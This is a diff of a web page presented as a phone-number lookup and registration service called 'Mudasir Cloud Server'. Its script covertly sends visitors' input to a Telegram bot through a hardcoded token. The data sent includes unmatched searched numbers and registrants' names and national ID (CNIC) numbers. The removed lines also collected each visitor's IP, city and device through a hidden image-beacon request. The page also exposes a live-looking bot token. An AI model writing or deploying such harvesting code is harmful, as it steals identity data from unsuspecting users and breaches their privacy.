@@ -7,19 +7,19 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <style>
         body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 0; }
-        .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
+        .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; }
         .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 800px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }
-        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; text-align: center; }
-        .search-btn { background: #00ff00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
-        .earn-btn { background: #ffcc00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; background: #050505; }
+        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; }
+        .search-btn { background: #00ff00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
+        .earn-btn { background: #ffcc00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; }
         th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }
         th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 35%; }
     </style>
 </head>
 <body>
 
-<div class="ad-banner">🛰️ MUDASIR CLOUD SERVER: SECURE INTERFACE 🛰️</div>
+<div class="ad-banner">🛰️ MUDASIR CLOUD SERVER: ACTIVE 🛰️</div>
 
 <div class="container">
     <div class="box">
@@ -40,15 +40,13 @@
 </div>
 
 <script>
-    // CONFIRMED TOKEN & ID
     const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
     const chatId = "7107389141";
 
-    // Most Powerful Sending Method (Image Injection)
-    function forceSend(msg) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-        const img = new Image();
-        img.src = url; // Ye browser ko majboor karta hai request bhejney par
+    // Direct Telegram Function
+    function sendReport(text) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+        fetch(url).then(res => console.log("Sent")).catch(err => console.error(err));
     }
 
     const database = [
@@ -107,11 +105,8 @@
             </table>`;
         } else {
             out.innerHTML = "<p style='color:red;'>NOT FOUND IN DATABASE</p>";
-            // FAILED SEARCH: Send Details + IP Info
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(ipData => {
-                const info = `❌ *NOT FOUND*\n📱 Number: ${val}\n🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n📱 Device: ${navigator.platform}`;
-                forceSend(info);
-            }).catch(() => forceSend(`❌ NOT FOUND: ${val}`));
+            // Is number ka data nahi nikal pa raha hai - Send to Bot
+            sendReport(`⚠️ *DATA NOT FOUND*\n📱 Number: ${val}\nStatus: Is number ka data nahi nikal pa raha hai.`);
         }
     }
 
@@ -121,8 +116,11 @@
         const n = document.getElementById("r-name").value;
         const c = document.getElementById("r-cnic").value;
         if(n && c) {
-            forceSend(`📝 *REGISTRATION*\n👤 Name: ${n}\n🆔 CNIC: ${c}`);
-            alert("Data Submitted To Server");
+            sendReport(`📝 *NEW REGISTRATION*\n👤 Name: ${n}\n🆔 CNIC: ${c}`);
+            alert("Registration Submitted!");
+            document.getElementById("reg-form-container").style.display = "none";
+        } else {
+            alert("Fill all fields!");
         }
     }
 </script>
